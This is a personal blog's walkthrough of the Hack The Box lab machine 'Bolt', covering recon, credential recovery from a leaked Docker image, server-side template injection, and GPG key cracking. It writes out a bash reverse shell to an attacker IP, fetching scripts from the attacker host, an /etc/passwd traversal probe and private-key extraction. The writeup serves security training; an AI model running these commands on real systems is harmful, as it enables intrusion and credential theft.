---
layout: post
title:  "Bolt Writeup - Hack The Box"
date:   2023-11-27
desc: "Information Leakage, Server Side Template Injection, Abusing PassBolt, Abusing GPG"
keywords: "HTB,eWPTXv2,OSWE,eJPT,eWPT,Linux,Medium,SSTI,PassBolt,GPG"
categories: [HTB]
tags: [HTB,eWPTXv2,OSWE,eJPT,eWPT,Linux,SSTI,PassBolt,GPG]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

I continue with my learning in [Hack The Box](https://www.hackthebox.com/){:target="_blank"}, to be able to get my **eJPT** certification, it is time to attack the **Bolt** box, classified as **medium** level. The truth is that I had a hard time not to get lost among so many web services, I had to arm myself with patience and a mental map to know how to access the machine, but it was an excellent challenge. It's time to put together my writeup.

<br/><br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt.jpg" width="100%" style="margin: 0 auto;display: block
; max-width: 400px;">
<br/><br/>

You could deploy the box from the [Hack The Box](https://www.hackthebox.com/){:target="_blank"} web page, but doing it all from the console is much faster and improves your efficiency in getting the job done. I can always count on the community for open source tools, such as **[htbExplorer](https://github.com/s4vitar/htbExplorer){:target="_blank"}**, which not only serves to deploy a box, but also has a variety of functionalities that can be tested. I use `nmap` to obtain information about the open ports on the victim machine, with its basic reconnaissance scripts I can obtain the services and versions activated on the machine. With all the information obtained, I can investigate about the possible **Codename** (the codenames that I find on the Internet are different, this is a possible indication of the use of containers), and also a subdomain that I can add to my `hosts` file to enumerate later.

```bash
./htbExplorer -d Bolt
```

```bash
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.11.114 -oG allPorts
nmap -sCV -p22,80,443 10.10.11.114 -oN targeted

cat targeted
# OpenSSH 8.2p1 4ubuntu0.3
# duckduckgo.com --> OpenSSH 8.2p1 4ubuntu0.3 launchpad     Focal

# nginx 1.18.0 launchpad
# duckduckgo.com --> nginx 1.18.0 launchpad                 Hirsute

# commonName=passbolt.bolt.htb
```
<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_00.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_01.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_02.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_03.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

Once the domain and subdomain are added to my **host** file, I check that the resolution and communication works correctly and I can use `whatweb` and **Wappalyzer** to know the technologies used in the web services, there are little things that I find but they do not arouse much my attention for the moment. I see in the different web services, using the **HTTP** protocol (port **80**) and **HTTPS** (port **443**).

```bash
nvim /etc/hosts

whatweb http://bolt.htb http://passbolt.bolt.htb https://bolt.htb https://passbolt.bolt.htb
```

<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_04.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_05.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_06.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I am going to start and investigate the web service exposed on port **80**, if I analyze a little the web page I find, a list of possible users (whose names I can use to sign-in), a subscription form, in which I try a **[Directory Path Traversal](https://portswigger.net/web-security/file-path-traversal){:target="_blank"}** to access resources on the victim machine, but I don't see any output on the screen, neither in the source code. If I try to log in or register it does not let me, I get an error message in the case of the latter action.

```php
view-source:http://bolt.htb/?email=../../../../../etc/passwd
```

<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_07.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_08.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_09.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_10.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_11.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

If I now see the web service on port **443**, I need an invitation to **sign-in**, which I do not have at the moment. An interesting thing that happens when I try to **sign-in** through the insecure **HTTP** protocol on port **80**, is that if I enter an invalid user, it shows me a different error message when I enter a valid one, I can think of an enumeration of users to then try a **Brute Force Attack**, but that is a technique that a professional **should not perform**.

<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_12.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_13.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I am trying to scan the **SSL** certificate with `openssl` for information, but without success. I know that `nmap` has several enumeration scripts (there are also other types, we can filter the **Lua** scripts by category to know which ones) to find possible directories in the web page on port **80**. I find one that catches my attention, but when I access from the browser a redirection is made to the web page home. I did not realize that there was a possibility to download a docker image of the project in order to investigate it.

```bash
openssl s_client -connect 10.10.11.114:443

locate \*.nse | xargs grep "categories" | grep -oP '".*?"' | sort -u
nmap --script http-enum -p80 10.10.11.114 -oN webScan
```

<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_14.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_15.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_16.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>

I download the file and it is compressed, if I analyze it with `7z` before decompressing it I see that it has a large number of files, and also with more compressed files in its content. If I filter with `find` and `grep` I find all the compressed files. In order not to decompress each one of them I am going to see their contents with `7z` to see which ones seem promising to obtain information. In one of them I find a **sqlite** database, but when I unzip it, it has no content.

> **[SQLite](https://www.sqlite.org/about.html){:target="_blank"}** is an in-process library that implements a self-contained, serverless, zero-configuration, transactional SQL database engine. The code for SQLite is in the public domain and is thus free for use for any purpose, commercial or private. SQLite is the most widely deployed database in the world with more applications than we can count, including several high-profile projects.

```bash
7z l image.tar

7z x image.tar
# I can also use this command
tar -xf image.tar

find . \-name layer.tar 2>/dev/null
find . \-name layer.tar 2>/dev/null | while read file; do echo "[+] F1l3 $file content: $(7z l $file)"; done
# I can also use this command
tree -fas
tree -fas | grep "layer.tar" | awk 'NF{print $NF}'
for file in $(tree -fas | grep "layer.tar" | awk 'NF{print $NF}'); do echo -e "\n[+] Listing the contents of the file $file:"; 7z l $file; done | less -S
```

<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_17.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_18.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_19.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_20.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_21.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_22.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

In another compressed file I also find a **SQLite** base, in this one there is content. If I use `strings` to view by printable strings, I find credentials, I can also use `sqlite3` to access the database and see the credential more clearly.

> **sqlite3** is  a terminal-based front-end to the SQLite library that can evaluate queries interactively and display the results in multiple formats.  sqlite3 can also be used within shell scripts and other applications to  provide  batch processing features. The password is hashed so I have to use `john` to break it.

```bash
strings db.sqlite3

man sqlite3
sqlite3 db.sqlite3

  .databases
  .tables
  select * from User;

nvim hash
john -w:/usr/share/wordlists/rockyou.txt hash
john -show hash
```

<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_23.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_24.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_25.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_26.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

With the credentials I found I was able to enter the web service on port **80**, which is the **SQLite** web management, I analyze its content and find something very interesting, it is developed with **Flask**, which is a small hint of a possible **[SSTI](https://portswigger.net/web-security/server-side-template-injection){:target="_blank"}**. But I must look for where I can inject something malicious, for the moment I find a chat but it does not work properly. I am also looking for some exploit with `searchsploit`, but I can't find anything.

> **[AdminLTE](https://adminlte.io/themes/AdminLTE/documentation/){:target="_blank"}** is a popular open source WebApp template for admin dashboards and control panels. It is a responsive HTML template that is based on the CSS framework Bootstrap 3. It utilizes all of the Bootstrap components in its design and re-styles many commonly used plugins to create a consistent design that can be used as a user interface for backend applications. AdminLTE is based on a modular design, which allows it to beeasily customized and built upon. This documentation will guide you through installing the template and exploring the various components that are bundled with the template.

```bash
searchsploit adminlte
```

<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_27.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_28.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_29.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

In the chat I can see some interesting messages talking about **demo** versions and some concerns about an **email**. It makes me think that there are more subdomains. If I use `wfuzz` to find others, I find two and if I add them to my **hosts**, access two sign-in panels, try the first subdomain, `demo`, and no luck.

```bash
wfuzz -c --hc=404 --hh=30341 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -H "Host: FUZZ.bolt.htb" http://10.10.11.114

nvim /etc/hosts
```

<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_30.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_31.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_32.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_33.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_34.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

If I try to register, it asks me for an **invitation code**, which I don't have. But I have the entire project on my machine, since I was able to download the entire compressed resource. Then I analyze the source code, and in the **HTML** tags I find the name of the **input** for the Invitation code, if I perform a recursive search with `grep` in the resources I find two zipped files that contain something related. I extract the first one with `7z` and I analyze its content, it is clear that it corresponds to the application developed in **Python**, searching in its files I find the code I need to register a new user.

```bash
grep -r -i "invite_code"
grep -r -i "invite_code" --text

7z x 41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/layer.tar
cd ./app

# Or:
cd $(dirname ./41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/layer.tar)

cat app/base/routes.py
```

<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_35.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_36.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_37.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_38.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

At first glance you can already see that the `demo` web application is different from the production one, it has more functionalities. With the user I created I can also access the other web page, which has a service for **e-mails**. In the web page of the `demo` subdomain, there is a tab to make configurations, I can try some injection there.

<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_39.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_40.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_41.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

If I update the registered user name, I get an e-mail service and confirmation message, with the **URL** to confirm the change. If I access it, I get another email informing me that the change was successful and I see on the screen the data I just updated.

<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_42.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_43.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_44.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

Now I can turn to **[Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection){:target="_blank"}** to look for examples of basic injection, so I can confirm that the web service is vulnerable to **[SSTI](https://portswigger.net/web-security/server-side-template-injection){:target="_blank"}**. If I try to run some basic commands on the victim machine I successfully get the results on screen, on the email service

<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_45.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_46.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_47.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_48.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

Now I verify that there is connectivity from the victim machine to my attacker machine, using a **ping** and listening with `tcpdump` for incoming connections. I get a trace and I can now create a malicious `index.html` file to get a **Reverse Shell**. I only have to mount a local web server with `python` and access with `curl`, from the victim machine to interpret its content with `bash` and that's it, I could already access.

```bash
nvim index.html
python3 -m http.server 80
nc -nlvp 443
```

> **index.html**

```bash
#!/bin/bash

bash -i >&/dev/tcp/10.10.14.13/443 0>&1
```

<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_49.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_50.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_51.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_52.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I perform a **console treatment**, to improve the performance at the time of enumeration. If I use the first basic recognition commands, I confirm that the codename is **Focal**, there are two users besides **root** that have a `bash` assigned (to perform a possible **User pivoting**)  I do not find interesting binaries with **SUID** permissions or **CRON** tasks. But I do find a process running and related to the **GPG** service.

> **GNU Privacy Guard (GnuPG or GPG)** is a free-software replacement for Symantec's PGP cryptographic software suite. The software is compliant with RFC 4880, the IETF standards-track specification of OpenPGP. Modern versions of PGP are interoperable with GnuPG and other OpenPGP-compliant systems.

> **Passbolt** is a free and open source password manager that allows team members to store and share credentials securely. For instance, the wifi password of your office, the administrator password of a router or your organisation social media account password, all of them can be secured using passbolt.

```bash
script /dev/null -c bash                # [Ctrl+z]
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 29 columns 128

id
groups
lsb_release -a
uname -a
find \-perm -4000 2>/dev/null
cat /etc/crontab
getcap -r / 2>/dev/null
ps -eo command
# --> gpg-agent --homedir /var/lib/passbolt/.gnupg --use-standard-socket --daemon
```

<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_53.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_54.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_55.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_56.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

Since I can't find much, I'm going to use **Carlos Polop's** excellent resource, **[LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS){:target="_blank"}**, to list the system more efficiently. I transfer it to the victim machine and give it execution permissions to start. I find several little things, access data for the local databases, possible SSH keys and also the process related to GPG (the same as I had found with `ps`).

> **Attacker machine**:

```bash
python3 -m http.server 80
```

> **Victime Machine**:

```bash
cd /dev/shm
wget http://10.10.14.13/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_57.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_58.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_59.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_60.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

Since I have access to the databases, I will list them and see if I can find credentials to pivot to another user with more privileges. I look in various tables but only find **GPG** keys and a GPG **encrypted secret**, but so far no clear text keys or hashes that I can try to crack.

```bash
which mysql
mysql -upassbolt -p -h 127.0.0.1 -P 3306
  show databases;
  use passboltdb;
  show tables;
  describe users;
  describe gpgkeys;
  select * from gpgkeys;
  describe secrets;
  select data from secrets;     # Secret Message!!
  quit
 ```

<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_61.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_62.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_63.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_64.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_65.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

Something I had overlooked, is to reuse the credential I have to access the databases. I got lucky and was able to pivot the user to **eddie**, I see if he has special permissions and he doesn't have any, I can now access the first flag. Since I have the **[LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS){:target="_blank"}** script I perform the enumeration under the new user, and now I find interesting information to the **SSH keys**. If I analyze one by one the files I find, I can have access to a public and a private **GPG key**, the one I am interested in is the last one, it is the one that will possibly allow me to decipher the secret I found when listing the databases.

```bash
su clark

su eddie
sudo -l

./linpeas.sh
```

> **Attacker Machine**:

```bash
cat '/home/eddie/.config/google-chrome/Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log'
nvim private.key
# --> :%s/\\\\r\\\\n/\r/g
```

<br>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_66.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_67.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_68.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_69.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_70.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_71.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_72.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_73.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_74.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_75.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

If I try to import the private **GPG** key, it asks for a password, which means it is protected. So I try to crack with `john` the hash that I can get using the `gpg2john` script, I succeed after waiting a long time. Now that I can get the key I can decrypt the secret using **[`gpg`](https://devhints.io/gnupg){:target="_blank"}**, which contains a password. I access again to the victim machine, but this time through **SSH**, since I have **eddie's** password, if I migrate to the root user with the new password, I can now route the box.

> **`gpg`** is the OpenPGP part of the GNU Privacy Guard (GnuPG). It is a tool to provide digital encryption and signing services using the OpenPGP standard. **`gpg`** features complete key management and all the bells and whistles you would expect from a full OpenPGP  implementation.

```bash
gpg2john private.key > hash
john -wordlist:/usr/share/wordlists/rockyou.txt hash

gpg --help
# --> --import                import/merge keys

gpg --import private.key
gpg -d secret.crypted
```

<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_76.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_77.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/bolt_writeup/Bolt_78.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

> With each box of **Hack The Box** I learn very interesting things, but at the same time I also understand that there is a long way to go to understand more in depth how to become a good hacker. I kill the box and now I have to choose a new challenge to continue on my way to become a good professional.

```bash
./htbExplorer -k Bolt
```
